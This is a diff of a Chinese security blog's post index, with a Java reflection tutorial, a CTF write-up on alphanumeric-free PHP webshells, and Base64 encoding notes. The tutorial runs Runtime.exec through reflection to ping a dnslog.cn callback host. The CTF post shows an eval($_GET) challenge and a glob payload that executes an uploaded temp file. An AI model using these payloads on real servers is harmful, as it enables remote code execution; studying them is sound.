+    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><a href="https://baike.baidu.com/item/JAVA反射机制/6015990" target="_blank" rel="noopener">JAVA反射机制</a>是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制</p>
+<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h3><pre><code class="java">package test;
+import java.lang.Class.*;
+
+public class reflection1 {
+    public static void main(String[] args) throws Exception {
+            Class.forName(&quot;test.xxx&quot;);
+    }
+}
+class xxx{
+    public void  xxx(){
+        System.out.println(&quot;hello world&quot;);
+    }
+    static {
+        System.out.println(&quot;test1&quot;);
+    }
+    {
+        System.out.println(&quot;test2&quot;);
+    }
+}</code></pre>
+<ul>
+<li>当<code>forName</code>方法获取一个类的时候会调用这个类的static静态代码。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-134345@2x.png" alt="WX20201115-134345@2x"></p>
+<h3 id="获取类方法"><a href="#获取类方法" class="headerlink" title="获取类方法"></a>获取类方法</h3><h4 id="获取全部方法"><a href="#获取全部方法" class="headerlink" title="获取全部方法"></a>获取全部方法</h4><ul>
+<li><code>getMethod</code>来获取函数的方法，执行<code>invoke</code>后通过<code>newInstance</code>来调用构造函数，但是<code>{}</code>的优先级会比构造方法高，所以运行结果会是先<code>{}</code>、构造方法、普通方法。</li>
+</ul>
+<pre><code class="java">package test;
+public class reflection1 {
+    public static void main(String[] args) throws Exception {
+        Class clazz=Class.forName(&quot;test.xxx&quot;);
+        //实例化类,然后调用方法
+        clazz.getMethod(&quot;hello&quot;).invoke(clazz.newInstance());
+    }
+}
+class xxx{
+    public   xxx(){
+        System.out.println(&quot;test1&quot;);
+    }
+    public void hello(){
+        System.out.println(&quot;hello&quot;);
+    }
+    static {
+        System.out.println(&quot;test2&quot;);
+    }
+    {
+        System.out.println(&quot;test3&quot;);
+    }
+}</code></pre>
+<ul>
+<li>运行结果</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-143559@2x.png" alt="WX20201115-143559@2x"></p>
+<h4 id="获取无参数构造方法"><a href="#获取无参数构造方法" class="headerlink" title="获取无参数构造方法"></a>获取无参数构造方法</h4><ul>
+<li>同样先需要获取到对应的类对象，然后通过<code>getDeclaredConstructor</code>方法来获取构造方法，这里有个细节如果获取的构造方法是私有（private）时候需要使用<code>setAccessible</code>,最后使用<code>newInstance</code>来创建实例。</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+
+public class reflection1 {
+    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
+        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor();
+        constructor.setAccessible(true);
+        constructor.newInstance();
+    }
+}
+class zzz{
+    private zzz(){
+        System.out.println(&quot;this is zzz&quot;);
+    }
+    private zzz(String name){
+        System.out.println(&quot;this is &quot;+name);
+    }
+    private zzz(int age,String name){
+        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
+    }
+}</code></pre>
+<h4 id="获取含参数构造方法"><a href="#获取含参数构造方法" class="headerlink" title="获取含参数构造方法"></a>获取含参数构造方法</h4><ul>
+<li>同样使用<code>getDeclaredConstructor</code>方法来获取，但是需要指定参数数据类型。然后在<code>newInstance</code>传参即可。</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+
+public class reflection1 {
+    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
+        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class);
+        constructor.setAccessible(true);
+        constructor.newInstance(&quot;黄莉荃&quot;);
+    }
+}
+class zzz{
+    private zzz(){
+        System.out.println(&quot;this is zzz&quot;);
+    }
+    private zzz(String name){
+        System.out.println(&quot;this is &quot;+name);
+    }
+    private zzz(int age,String name){
+        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
+    }
+}</code></pre>
+<h6 id="getDeclaredConstructors"><a href="#getDeclaredConstructors" class="headerlink" title="getDeclaredConstructors"></a>getDeclaredConstructors</h6><ul>
+<li><code>getDeclaredConstructors</code>将会返回所有构造方法的数组</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-153623@2x.png" alt="WX20201115-153623@2x"></p>
+<ul>
+<li>以获取索引为2的方法为例：</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+
+public class reflection1 {
+    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
+        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
+        Constructor&lt;?&gt;[] constructors = clazz.getDeclaredConstructors();
+        Constructor constructor = constructors[2];
+        constructor.setAccessible(true);
+//      输出内容
+        System.out.println(constructor);
+        constructor.newInstance(18,&quot;黄莉荃&quot;);
+    }
+}
+class zzz{
+    private zzz(){
+        System.out.println(&quot;this is zzz&quot;);
+    }
+    private zzz(String name){
+        System.out.println(&quot;this is &quot;+name);
+    }
+    private zzz(int age,String name){
+        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
+    }
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-154252@2x.png" alt="WX20201115-154252@2x"></p>
+<h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><ul>
+<li>通过<code>getDeclaredField</code>来获取字段，如果是私有字段只需加上<code>field.setAccessible(true);</code>即可</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class reflection1 {
+    public static &lt;Feild&gt; void main(String[] args) throws Exception {
+        //获取类
+        Class clazz=Class.forName(&quot;test.test&quot;);
+        //获取私有方法
+        Constructor c = clazz.getDeclaredConstructor();
+        //获取私有字段
+        Field field = clazz.getDeclaredField(&quot;age&quot;);
+        System.out.println(field.get(c.newInstance()));
+    }
+}
+
+class test{
+    public test(){
+        System.out.println(&quot;test&quot;);
+    }
+    public int age=222;
+}</code></pre>
+<h4 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h4><ul>
+<li>使用set方法即可修改</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class reflection1 {
+    public static &lt;Feild&gt; void main(String[] args) throws Exception {
+        //获取类
+        Class clazz=Class.forName(&quot;test.test&quot;);
+        //获取私有方法
+        Constructor c = clazz.getDeclaredConstructor();
+        //获取私有字段
+        Object o = c.newInstance();
+        Field field = clazz.getDeclaredField(&quot;age&quot;);
+        field.set(o,1111);
+        System.out.println(field.get(o));
+    }
+}
+
+class test{
+    public test(){
+        System.out.println(&quot;test&quot;);
+    }
+    public int age=222;
+}</code></pre>
+<h4 id="反射调用java-lang-Runtime"><a href="#反射调用java-lang-Runtime" class="headerlink" title="反射调用java.lang.Runtime"></a>反射调用<code>java.lang.Runtime</code></h4><h5 id="利用方法一"><a href="#利用方法一" class="headerlink" title="利用方法一"></a>利用方法一</h5><pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class reflection1 {
+    public static &lt;Feild&gt; void main(String[] args) throws Exception {
+        Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);
+        Constructor c = clazz.getDeclaredConstructor();
+        c.setAccessible(true);
+        clazz.getMethod(&quot;exec&quot;, String.class).invoke(c.newInstance(),&quot;open /Users/gqleung/Desktop/aaaa.txt&quot;);
+    }
+}</code></pre>
+<ul>
+<li>成功打开桌面的<code>aaaa.txt</code></li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-160241@2x.png" alt="WX20201115-160241@2x"></p>
+<h5 id="利用方法二"><a href="#利用方法二" class="headerlink" title="利用方法二"></a>利用方法二</h5><pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class reflection1 {
+    public static &lt;Feild&gt; void main(String[] args) throws Exception {
+        Class clazz=Class.forName(&quot;java.lang.Runtime&quot;);
+        clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;ping y3qge8.dnslog.cn&quot;);
+    }
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-161159@2x.png" alt="WX20201115-161159@2x"></p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -1117,202 +1412,82 @@ end</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>BASE64编码原理学习笔记</title>
-    <url>//articles/d37b850031.html</url>
-    <content><![CDATA[<h1 id="Base64编码原理解析"><a href="#Base64编码原理解析" class="headerlink" title="Base64编码原理解析"></a>Base64编码原理解析</h1><p>Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符</p>
-<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>‘A’ 转变为Base64编码：</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190906/15677508068341.png" alt="img"></p>
-<h2 id="表格流程"><a href="#表格流程" class="headerlink" title="表格流程"></a>表格流程</h2><table>
-<thead>
-<tr>
-<th>字符</th>
-<th>A</th>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>AIISC码</td>
-<td>65</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>二进制</td>
-<td>01000001</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>分组</td>
-<td>010000</td>
-<td>01000000</td>
-<td>=</td>
-<td>=</td>
-</tr>
-<tr>
-<td>十进制</td>
-<td>16</td>
-<td>16</td>
-<td>=</td>
-<td>=</td>
-</tr>
-<tr>
-<td>BASE64</td>
-<td>Q</td>
-<td>Q</td>
-<td>=</td>
-<td>=</td>
-</tr>
-</tbody></table>
-<h2 id="BASE64查询表"><a href="#BASE64查询表" class="headerlink" title="BASE64查询表"></a>BASE64查询表</h2><pre><code class="python">[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
-                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
-                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
-                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]</code></pre>
-<p>从上方流程可以简单知道BASE64是先转换为AIISC码再转换为二进制进而将8位bit分组为6位bit最后不足补0，如组数不足4组，那么就用等于号（“=”）补充。最后将分组的各组再转换为10进制，按照换回来的数字当做base64编码表的形式进行查表得出结果。例如16就是在上述表中找第17位也就是数组的第16位。</p>
-<h2 id="Python实现BASE64编码"><a href="#Python实现BASE64编码" class="headerlink" title="Python实现BASE64编码"></a>Python实现BASE64编码</h2><pre><code class="python">import re
-base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
-                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
-                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
-                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]
-def num_10_to_2(numbers):
-    result=[]
-    tmp=[]
-    return_str=&#39;&#39;
-    for number in numbers:
-        while number/2!=0:
-            result.append(int(number%2))
-            number=int(number/2)    
-        if(len(result)&lt;8):
-            for i in range(0,8-len(result)):
-                result.append(0)
-        number_2=&#39;&#39;
-        for i in range(0,len(result)):    
-            nums=len(result)-i-1
-            number_2=str(result[nums])+number_2
-        tmp.append(number_2)
-        result=[]
-    for i in range(len(tmp)):
-        return_str=return_str+tmp[i][::-1]
-    return return_str
-def num_2_to_10(number):
-    number=str(number)
-    nums=0
-    for i  in number:
-        nums=nums*2+int(i)
-    return nums            
-
-def str_to_aiisc(str_char):
-    tmp=[]
-    for i in str_char:
-         tmp.append(int(ord(i)))    
-    return tmp
-def cut_string(strings,lenth):
-    result =  re.findall(&#39;.{&#39;+str(lenth)+&#39;}&#39;,strings)
-    result.append(strings[(len(result)*lenth):]) #把最后几位加上
-    for i in range(0,6-len(result[len(result)-1])):
-        result[len(result)-1]=result[len(result)-1]+str(&#39;0&#39;)
-    return result
-def main(strings):
-    group_base = cut_string(num_10_to_2(str_to_aiisc(strings)),6)
-    if(group_base[len(group_base)-1])==&#39;000000&#39;:
-        group_base.pop(len(group_base)-1)
-    #print(group_base)
-    for i in group_base:
-        print(base64_table[num_2_to_10(i)], end=&#39;&#39;)
-    #print(4-int((len(group_base)/4)/0.25)%4)    
-    for i in range(4-int((len(group_base)/4)/0.25)%4):
-        print(&quot;=&quot;, end=&#39;&#39;)
-    print(&#39;\n&#39;)    
-if __name__==&#39;__main__&#39;:
-    main(&#39;A&#39;)</code></pre>
-<h2 id="PHP实现BASE64编码"><a href="#PHP实现BASE64编码" class="headerlink" title="PHP实现BASE64编码"></a>PHP实现BASE64编码</h2><pre><code class="php">&lt;?php
-function num_10_to_2($number){
-    $result=[];
-    $tmp=[];
-    $number_2=&#39;&#39;;
-    for($i=0;$i&lt;count($number);$i++){
-        while ($number[$i]/2!=0) {
-        array_push($result,intval($number[$i]%2));
-        $number[$i]=intval($number[$i]/2);
-        }
-        for($j=0;$j&lt;count($result);$j++){
-            $nums = count($result)-$j-1;
-            $number_2 = strval($result[$nums]).$number_2;
-        }
-        ///echo $number_2.&#39;&lt;br&gt;&#39;;
-        array_push($tmp,$number_2);
-        $number_2=&#39;&#39;;
-        $result=[];
+    <title>《无字母数字webshell之提高篇》读书笔记</title>
+    <url>//articles/b7770c5dc9b5b.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
+<li>前几天曾经教过的学员给我甩来了这么一道题。虽然想出了用通配符做，但是没有实际做出来，总的来说就是对无字母的webshell学习不够仔细，限于做出一道CTF题目为止的，蜻蜓点水的状态。</li>
+</ul>
+<h3 id="题目解决流程"><a href="#题目解决流程" class="headerlink" title="题目解决流程"></a>题目解决流程</h3><h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><pre><code class="php"> &lt;?php
+if(isset($_GET[&#39;evil&#39;])){
+    if(strlen($_GET[&#39;evil&#39;])&gt;25||preg_match(&quot;/[\w$=()&lt;&gt;&#39;\&quot;]/&quot;, $_GET[&#39;evil&#39;])){
+        die(&quot;danger!!&quot;);
     }
-    //var_dump($tmp);
-    for($j=0;$j&lt;count($tmp);$j++){
-    if(strlen($tmp[$j])&lt;8){
-        for($i=0;$i&lt;8-strlen($tmp[$j]);$i++){
-            $tmp[$j]=$tmp[$j].&#39;0&#39;;
-        }
-        $tmp[$j]=strrev($tmp[$j]);
-        //echo $tmp[$j].&#39;&lt;br&gt;&#39;;
-    }
-    }
-
-```
-return implode($tmp);
-```
-
+    @eval($_GET[&#39;evil&#39;]);
 }
-function num_2_to_10($number){
-    $number = strval($number);
-    $nums = 0;
-    for($i=0;$i&lt;strlen($number);$i++){
-        $nums = $nums*2+intval(substr($number,$i,1));
-    }
-    return $nums;
-}
-function str_to_aiisc($str_char){
-    $result=[];
-    $str_char = strval($str_char);
-    for($i=0;$i&lt;strlen($str_char);$i++){
-        array_push($result,intval(ord(substr($str_char,$i,1))));
-    }
-    return $result;
-}
-function cut_string($number,$lenth){
-    $number = strval($number);
-    $number =  str_split($number,intval($lenth));
-    for($i=0;$i&lt;count($number);$i++){
-        if(strlen($number[$i])&lt;6){
-            $number[$i]=$number[$i].str_repeat(&#39;0&#39;, 6-strlen($number[$i]));
-        }
-    }
-    return $number;
-}
-function base64Encode($strings){
-    $base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
-                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
-                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
-                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;];
-    $result=&#39;&#39;;
-    $group_bas64 = cut_string(num_10_to_2(str_to_aiisc($strings)),6);
-    for($i=0;$i&lt;count($group_bas64);$i++){
-        $result=$result.$base64_table[num_2_to_10($group_bas64[$i])];
-    }
-    for($i=0;$i&lt;4-intval((count($group_bas64)/4)/0.25)%4;$i++){
-        $result=$result.&quot;=&quot;;
-    }
-    return $result;
-}
- echo base64Encode(&#39;ABaaa&#39;)
+highlight_file(__FILE__);
 ?&gt;</code></pre>
+<h4 id="单个字符的Fuzz"><a href="#单个字符的Fuzz" class="headerlink" title="单个字符的Fuzz"></a>单个字符的Fuzz</h4><ul>
+<li>题目主要是过滤了单个字符，这种Fuzz能够快速得知我们还有哪些字符能够用。编写一个脚本：</li>
+</ul>
+<pre><code class="php">&lt;?php
+for ($ascii = 0; $ascii &lt; 256; $ascii++) {
+    if (!preg_match(&quot;/[\w$=()&lt;&gt;&#39;\&quot;]/&quot;, chr($ascii))) {
+        echo (chr($ascii));
+    }
+}
+?&gt;
+//运行结果
+// !#%&amp;*+,-./:;?@[\]^`{|}~��������������������������������������������������������������������������������������������������������������������������������[Finished in 0.3s]
+</code></pre>
+<ul>
+<li>可以快速地看到，我们呢广告用 的只有(!#%&amp;*+,-./:;?@[]^`{|}~),这里$,()都已经被过滤，不论是取反、异或、或运算、位运算都是通过动态拼接函数来实现执行任意代码的。这里还不能使用可见的字符，使用require来包含flag也是不可能实现的。这里还能用的就是反引号了。我们知道反引号能执行shell,它本质就是调用shell_exec,这个函数执行的shell是不会有回显的，就算catflag也不会显示出来。做到这里基本就没有思路了。</li>
+</ul>
+<h4 id="有趣的Linux-shell"><a href="#有趣的Linux-shell" class="headerlink" title="有趣的Linux shell"></a>有趣的Linux shell</h4><ul>
+<li>回看P神的<code>《无字母数字webshell之提高篇》</code> ，可以 知道这么两个有趣的shell知识点：</li>
+</ul>
+<blockquote>
+<p>1.shell下可以利用<code>.</code>来执行任意脚本</p>
+<p>2.Linux文件名支持用glob通配符代替</p>
+</blockquote>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-090013@2x.png" alt="WX20201015-090013@2x"></p>
+<ul>
+<li>但是我们用通配符来执行这个SB脚本的时候却会报错：</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-090353@2x.png" alt="WX20201015-090353@2x"></p>
+<ul>
+<li>这说明我们能够匹配上<code>??</code>的文件或者目录很多，我们直接列出来看看</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-093749@2x.png" alt="WX20201015-093749@2x"></p>
+<ul>
+<li>这说明两个字符的文件还是有很多的，我们必须匹配上我们唯一的文件才有可能直线我们想要直接的代码。</li>
+</ul>
+<h5 id="有趣的glob通配符"><a href="#有趣的glob通配符" class="headerlink" title="有趣的glob通配符"></a>有趣的glob通配符</h5><ul>
+<li>我们都认识<code>*?</code>这两个通配符，其实在glob语法里面还支持类似于正则表达式的语法。例如<code>[^S]</code>就是排除掉S字母,我们可以排除掉S字母然后再列目录看看，就会发现SB这个文件被排除在外。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-094327@2x.png" alt="WX20201015-094327@2x"></p>
+<ul>
+<li>但是这里我们的要求是不能有字母数字，我们刚才说了glob是支持类似正则表达式的用法，如<code>[0-9]</code>,是支持的，那么我们在aiisc表中找出两个包含大写字母之间的字符就行了这样我们就能够成功获取到SB文件。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/aiisc.png" alt="aiisc"></p>
+<ul>
+<li>从AIISC表中我们可以知道，<code>@-[</code>是在大写字母之间的，那么我构造<code>[@-[]?</code>是不是能够匹配到SB了呢？答案是肯定的。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-145223@2x.png" alt="WX20201015-145223@2x"></p>
+<ul>
+<li>其实我们PHP在接受上传表单的文件流后会将文件保存到<code>/tmp</code>文件夹中，不论后端是否有编写上传的代码。而这个文件类似于这样的命名方式：<code>/tmp/phpXXXXXX</code>.</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c"></p>
+<ul>
+<li>和上面讨论的一样，这样匹配出来的回匹配到很多文件，我哦们可以看到后面两位或者一位可能是大写这样我们就可以用<code>.+/???/????????[@-[]</code>来匹配执行文件。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-212645@2x.png" alt="WX20201015-212645@2x"></p>
+<ul>
+<li>直接getflag</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-212949@2x.png" alt="WX20201015-212949@2x"></p>
 ]]></content>
-      <categories>
-        <category>编码学习</category>
-      </categories>
       <tags>
-        <tag>学习笔记</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1558,20 +1733,202 @@ gnuplot&gt;
       </tags>
   </entry>
   <entry>
-    <title>关于我</title>
-    <url>//articles/d3a8da2734.html</url>
-    <content><![CDATA[<p>ID:Gq/xiaoleung</p>
-<p>乌云ID:土豪</p>
-<p>一名CS大学生退役士兵，主要学习web安全的小菜鸡。</p>
-<p>热爱摄影，热爱户外，热爱编程和网络安全。</p>
-<p>Email:admin#plasf.cn</p>
-<p>WeChat:Q1BMQVhERg==</p>
+    <title>BASE64编码原理学习笔记</title>
+    <url>//articles/d37b850031.html</url>
+    <content><![CDATA[<h1 id="Base64编码原理解析"><a href="#Base64编码原理解析" class="headerlink" title="Base64编码原理解析"></a>Base64编码原理解析</h1><p>Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符</p>
+<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>‘A’ 转变为Base64编码：</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190906/15677508068341.png" alt="img"></p>
+<h2 id="表格流程"><a href="#表格流程" class="headerlink" title="表格流程"></a>表格流程</h2><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>A</th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AIISC码</td>
+<td>65</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>二进制</td>
+<td>01000001</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>分组</td>
+<td>010000</td>
+<td>01000000</td>
+<td>=</td>
+<td>=</td>
+</tr>
+<tr>
+<td>十进制</td>
+<td>16</td>
+<td>16</td>
+<td>=</td>
+<td>=</td>
+</tr>
+<tr>
+<td>BASE64</td>
+<td>Q</td>
+<td>Q</td>
+<td>=</td>
+<td>=</td>
+</tr>
+</tbody></table>
+<h2 id="BASE64查询表"><a href="#BASE64查询表" class="headerlink" title="BASE64查询表"></a>BASE64查询表</h2><pre><code class="python">[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
+                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
+                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
+                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]</code></pre>
+<p>从上方流程可以简单知道BASE64是先转换为AIISC码再转换为二进制进而将8位bit分组为6位bit最后不足补0，如组数不足4组，那么就用等于号（“=”）补充。最后将分组的各组再转换为10进制，按照换回来的数字当做base64编码表的形式进行查表得出结果。例如16就是在上述表中找第17位也就是数组的第16位。</p>
+<h2 id="Python实现BASE64编码"><a href="#Python实现BASE64编码" class="headerlink" title="Python实现BASE64编码"></a>Python实现BASE64编码</h2><pre><code class="python">import re
+base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
+                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
